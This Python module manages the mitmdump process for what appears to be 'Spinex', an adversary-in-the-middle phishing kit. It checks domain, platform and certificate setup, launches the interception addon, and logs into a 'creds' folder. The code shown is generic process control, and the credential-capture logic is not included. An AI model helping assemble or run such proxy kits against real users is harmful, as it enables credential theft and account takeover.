"""
proxy_launcher.py — Spinex mitmdump Process Manager

Handles starting, stopping, and monitoring the mitmdump process.
Reads all config from spinex_config.json via config_manager.
Writes stdout/stderr to a rolling log file for the UI to tail.
"""

import os
import subprocess
import signal
import psutil
import time
import datetime
import json
import threading
import traceback

import config_manager as cm
import cert_manager   as certm
import sys as _sys

_AITM_DIR     = os.path.dirname(os.path.abspath(__file__))
BASE_DIR      = os.path.dirname(_AITM_DIR)
if _AITM_DIR not in _sys.path:
    _sys.path.insert(0, _AITM_DIR)

CREDS_DIR     = os.path.join(BASE_DIR, "creds")
STATE_FILE    = os.path.join(BASE_DIR, "spinex_state.json")
PROXY_LOG     = os.path.join(CREDS_DIR, "proxy.log")
MAX_LOG_LINES = 500

os.makedirs(CREDS_DIR, exist_ok=True)

class PreflightResult:
    def __init__(self):
        self.passed  : list[str] = []
        self.warnings: list[str] = []
        self.errors  : list[str] = []

    @property
    def ok(self) -> bool:
        return len(self.errors) == 0

    def to_dict(self) -> dict:
        return {"ok": self.ok, "passed": self.passed,
                "warnings": self.warnings, "errors": self.errors}


def run_preflight(config: dict) -> PreflightResult:
    """
    Run all pre-launch checks. Returns a PreflightResult.

    Checks:
      1. Base domain configured
      2. At least one platform enabled
      3. TLS certificate on disk
      4. Combined PEM for mitmproxy exists
      5. aitm_addon.py exists
      6. mitmdump in PATH
      7. Cert expiry (warning if < 30 days, error if < 7)
    """
    result = PreflightResult()

    # 1. Base domain
    base = config.get("domain", {}).get("base", "").strip()
    if base:
        result.passed.append(f"Base domain: {base}")
    else:
        result.errors.append("Base domain not configured — go to AiTM Config.")

    # 2. Platforms
    active = cm.get_active_platforms(config)
    if active:
        result.passed.append(f"Platforms: {', '.join(active)}")
    else:
        result.errors.append("No platforms enabled — go to AiTM Config.")

    # 3. TLS cert
    cert_path, _ = cm.get_cert_paths(config)
    if os.path.exists(cert_path or ""):
        result.passed.append(f"Certificate: {cert_path}")
    else:
        result.errors.append(f"Certificate not found at {cert_path} — go to TLS Certificate page.")

    # 4. Combined PEM
    if os.path.exists(certm.COMBINED_CERT) and os.path.getsize(certm.COMBINED_CERT) > 0:
        result.passed.append(f"Combined PEM: {certm.COMBINED_CERT}")
    else:
        result.errors.append("Combined PEM missing — go to TLS Certificate → Build combined PEM.")

    # 5. aitm_addon.py
    addon = os.path.join(BASE_DIR, "aitm", "aitm_addon.py")
    if os.path.exists(addon):
        result.passed.append("aitm_addon.py found")
    else:
        result.errors.append(f"aitm_addon.py not found at {addon}")

    # 6. mitmdump
    try:
        check = subprocess.run(
            ["mitmdump", "--version"],
            capture_output=True, text=True, timeout=5,
        )
        if check.returncode == 0:
            version = check.stdout.strip().splitlines()[0]
            result.passed.append(f"mitmdump: {version}")
        else:
            result.errors.append("mitmdump returned an error. Re-install mitmproxy.")
    except FileNotFoundError:
        result.errors.append("mitmdump not in PATH. Run: pip install mitmproxy")
    except Exception as e:
        result.warnings.append(f"Could not check mitmdump version: {e}")

    # 7. Cert expiry
    status = certm.get_cert_status(config)
    if status.exists and status.days_left is not None:
        if status.days_left < 7:
            result.errors.append(f"Certificate expires in {status.days_left} days — renew immediately.")
        elif status.days_left < 30:
            result.warnings.append(f"Certificate expires in {status.days_left} days — renewal recommended.")

    return result

def _write_log(line: str) -> None:
    """Append a timestamped line to PROXY_LOG, rolling at MAX_LOG_LINES."""
    try:
        ts    = datetime.datetime.now().strftime("%H:%M:%S")
        entry = f"[{ts}] {line.rstrip()}\n"
        existing = []
        if os.path.exists(PROXY_LOG):
            with open(PROXY_LOG, "r", errors="replace") as f:
                existing = f.readlines()
        lines = existing[-(MAX_LOG_LINES - 1):] + [entry]
        with open(PROXY_LOG, "w", errors="replace") as f:
            f.writelines(lines)
    except Exception:
        pass


def read_log(n: int = 80) -> list[str]:
    """Return the last *n* lines from PROXY_LOG."""
    if not os.path.exists(PROXY_LOG):
        return []
    try:
        with open(PROXY_LOG, "r", errors="replace") as f:
            lines = f.readlines()
        return [l.rstrip() for l in lines[-n:]]
    except Exception:
        return []


def clear_log() -> None:
    try:
        open(PROXY_LOG, "w").close()
    except Exception:
        pass

def _save_proxy_state(pid: int, port: int) -> None:
    state = {}
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                state = json.load(f)
        except Exception:
            pass
    state["mitmproxy"] = {"pid": pid, "extra": {"port": port}}
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)


def _clear_proxy_state() -> None:
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
        state.pop("mitmproxy", None)
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)
    except Exception:
        pass


def get_proxy_pid() -> int | None:
    """Return PID of running mitmdump, or None."""
    if not os.path.exists(STATE_FILE):
        return None
    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
        pid = state.get("mitmproxy", {}).get("pid")
        if pid and psutil.pid_exists(int(pid)):
            return int(pid)
    except Exception:
        pass
    _clear_proxy_state()
    return None


def is_running() -> bool:
    return get_proxy_pid() is not None

def _stream_output(proc: subprocess.Popen) -> None:
    try:
        for line in proc.stdout:
            _write_log(line)
            if proc.poll() is not None:
                break
    except Exception:
        pass
    _write_log("--- mitmdump process ended ---")


def start(config: dict) -> tuple[bool, str]:
    """
    Start mitmdump using the command built from spinex_config.json.
    Returns (success, message).
    """
    if is_running():
        return False, "Proxy is already running."

    cmd = cm.build_mitmproxy_cmd(config)
    _write_log(f"Starting: {' '.join(cmd)}")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=(subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0),
        )

        time.sleep(3)

        if proc.poll() is not None:
            remaining = proc.stdout.read() if proc.stdout else ""
            _write_log(f"mitmdump exited immediately: {remaining}")
            return False, "mitmdump exited immediately. Check the proxy log."

        port = config.get("proxy", {}).get("port", 443)
        _save_proxy_state(proc.pid, port)
        _write_log(f"mitmdump started — PID {proc.pid}, port {port}")

        t = threading.Thread(target=_stream_output, args=(proc,), daemon=True)
        t.start()

        return True, f"Proxy started on port {port} (PID {proc.pid})"

    except FileNotFoundError:
        msg = "mitmdump not found. Install: pip install mitmproxy"
        _write_log(msg)
        return False, msg
    except Exception as e:
        msg = f"Failed to start: {e}"
        _write_log(msg)
        traceback.print_exc()
        return False, msg


def stop() -> tuple[bool, str]:
    """Stop the running mitmdump. Returns (success, message)."""
    pid = get_proxy_pid()
    if not pid:
        return False, "Proxy is not running."

    try:
        if os.name == "nt":
            os.system(f"taskkill /F /PID {pid} /T")
        else:
            os.kill(pid, signal.SIGTERM)
            for _ in range(10):
                if not psutil.pid_exists(pid):
                    break
                time.sleep(0.5)
            if psutil.pid_exists(pid):
                os.kill(pid, signal.SIGKILL)

        _clear_proxy_state()
        _write_log(f"mitmdump stopped — PID {pid}")
        return True, f"Proxy stopped (PID {pid})"

    except Exception as e:
        msg = f"Failed to stop: {e}"
        _write_log(msg)
        return False, msg


def get_process_info() -> dict:
    """Return CPU/memory/uptime for the running process, or {}."""
    pid = get_proxy_pid()
    if not pid:
        return {}
    try:
        proc   = psutil.Process(pid)
        uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(proc.create_time())
        return {
            "pid":       pid,
            "status":    proc.status(),
            "cpu":       f"{proc.cpu_percent(interval=0.2):.1f}%",
            "memory_mb": f"{proc.memory_info().rss / 1024 / 1024:.1f} MB",
            "uptime":    str(uptime).split(".")[0],
        }
    except Exception:
        return {"pid": pid, "status": "unknown"}